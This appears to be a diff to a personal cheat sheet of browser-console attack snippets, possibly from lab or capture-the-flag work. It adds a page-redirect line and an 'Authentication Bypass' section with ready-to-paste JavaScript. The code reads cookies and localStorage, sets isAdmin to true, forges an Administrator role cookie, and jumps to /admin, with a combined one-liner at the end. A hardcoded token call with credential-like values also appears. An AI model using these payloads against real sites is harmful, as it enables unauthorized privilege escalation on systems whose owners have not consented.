@@ -14,6 +14,9 @@ fetchServerContent("<URL>");
 document.addEventListener('click', (event) => {
   event.preventDefault();
 });
+
+# Change to a different location
+location.href = '/<URI>';
 ```
 
 # XSS Payload
@@ -68,4 +71,36 @@ document.addEventListener('click', (event) => {
 var pair = window.generateRequestVerificationToken('904160213', 'DeadDrop99');
 console.log(pair);
 # Hardcode into form...doesn't change
+```
+
+# Authentication Bypass
+```
+# Checks
+console.log('document.cookie =', document.cookie);
+console.log('localStorage.isAdmin =', localStorage.getItem('isAdmin'));
+console.log('localStorage keys =', Object.keys(localStorage));
+document.cookie = "Role-Identifier=Administrator; path=/";
+
+# Try changing localStorage
+// Try string 'true'
+localStorage.setItem('isAdmin', 'true');
+// or try numeric '1' if that was used
+localStorage.setItem('isAdmin', '1');
+
+// Verify:
+console.log('now isAdmin =', localStorage.getItem('isAdmin'));
+
+// then open admin page in same tab:
+location.href = '/admin';
+
+# Change cookie role
+// set Role-Identifier to 'Administrator' (path=/ so it applies everywhere)
+document.cookie = "Role-Identifier=Administrator; path=/";
+// verify
+console.log(document.cookie);
+
+location.href = '/admin';
+
+# One-liner
+localStorage.setItem('isAdmin','true'); document.cookie = "Role-Identifier=Administrator; path=/"; console.log('done'); location.href='/admin';
 ```
